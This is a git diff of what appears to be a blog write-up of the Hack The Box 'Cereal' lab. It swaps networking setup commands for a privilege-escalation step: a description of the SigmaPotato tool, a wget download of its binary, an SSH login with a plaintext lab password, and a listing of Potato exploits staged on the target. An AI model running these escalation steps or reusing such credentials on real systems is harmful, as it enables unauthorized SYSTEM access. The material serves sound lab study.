@@ -7,9 +7,11 @@ TocOpen: true
 tags:
   - blog
   - HTB
-lastmod: 2026-05-28T06:42:59.740Z
+lastmod: 2026-05-28T08:26:57.374Z
 ---
 # Box Info
+
+i think that lab is not for people to do it
 
 {{< htb-info "https://www.hackthebox.com/machines/Cereal" >}}
 
@@ -1120,48 +1122,43 @@ I’ll set the context to Release, and since there’s no x64 option, just leave
 
 https://0xdf.gitlab.io/2021/05/04/networking-vms-for-htb.html
 
-```
-┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Cereal]
-└──╼ $sudo iptables -t nat -A POSTROUTING -s 192.168.154.0/24 -o tun0 -j MASQUERADE
-[sudo] password for tester: 
+https://jlajara.gitlab.io/Potatoes\_Windows\_Privesc
+
+SigmaPotato, by tylerdotrar, is a modern .NET refactor of the GenericPotato family. It bundles two ergonomic wins over PrintSpoofer: a built-in –revshell flag that handles base64 PowerShell bootstrapping, and a SigmaPotatoCore.exe variant for environments where AMSI or AV signatures block the main binary. The underlying primitive is identical — a named pipe trap that impersonates the connecting SYSTEM client.
 
 ```
-
-![Pasted image 20260528141945.png](/ob/Pasted%20image%2020260528141945.png)
-
-![Pasted image 20260528142011.png](/ob/Pasted%20image%2020260528142011.png)
-
-![Pasted image 20260528142029.png](/ob/Pasted%20image%2020260528142029.png)
-
-```
-┌─[tester@parrot]─[~/Desktop]
-└──╼ $sudo nmcli con add type ethernet ifname ens36 con-name htb-bridge \
-  ipv4.addresses 192.168.154.10/24 \
-  ipv4.method manual \
-  connection.autoconnect yes
-[sudo] password for tester: 
-Connection 'htb-bridge' (39ea85c3-d2fd-42f9-9124-221e9f133e7a) successfully added.
-┌─[tester@parrot]─[~/Desktop]
-└──╼ $
+┌─[tester@parrot]─[~/Desktop/Tools]
+└──╼ $wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe 
 
 ```
 
 ```
-┌─[tester@parrot]─[~/Desktop]
-└──╼ $# Persistent
-echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
-sudo sysctl -p
-net.ipv4.ip_forward=1
-net.ipv4.ip_forward = 1
+┌─[tester@parrot]─[~/Desktop/Tools]
+└──╼ $sshpass -p 'mutual.madden.manner38974' ssh -o StrictHostKeyChecking=no sonny@10.129.5.17
 
 ```
 
 ```
-┌─[✗]─[tester@parrot]─[~/Desktop]
-└──╼ $sudo iptables -t nat -A POSTROUTING -s 192.168.154.0/24 -o tun0 -j MASQUERA
-```
+sonny@CEREAL C:\>cd /programdata/ 
+
+sonny@CEREAL C:\ProgramData>dir 
+ Volume in drive C has no label.   
+ Volume Serial Number is C4EF-2153 
+
+ Directory of C:\ProgramData
+
+05/27/2026  10:35 PM            57,344 GodPotato-NET35.exe
+05/27/2026  10:36 PM            57,344 GodPotato-NET4.exe
+11/18/2020  11:11 AM    <DIR>          Package Cache
+11/11/2020  12:50 PM    <DIR>          regid.1991-06.com.microsoft
+05/28/2026  12:49 AM            63,488 SigmaPotato.exe
+09/15/2018  12:12 AM    <DIR>          SoftwareDistribution
+03/16/2021  04:43 AM    <DIR>          ssh
+11/11/2020  12:53 PM    <DIR>          USOPrivate
+11/11/2020  12:53 PM    <DIR>          USOShared
+11/11/2020  12:48 PM    <DIR>          VMware
+               3 File(s)        178,176 bytes
 
 ```
-sudo apt install iptables-persistent -y
-sudo iptables-save | sudo tee /etc/iptables/rules.v4
-```
+
+![Pasted image 20260528155755.png](/ob/Pasted%20image%2020260528155755.png)
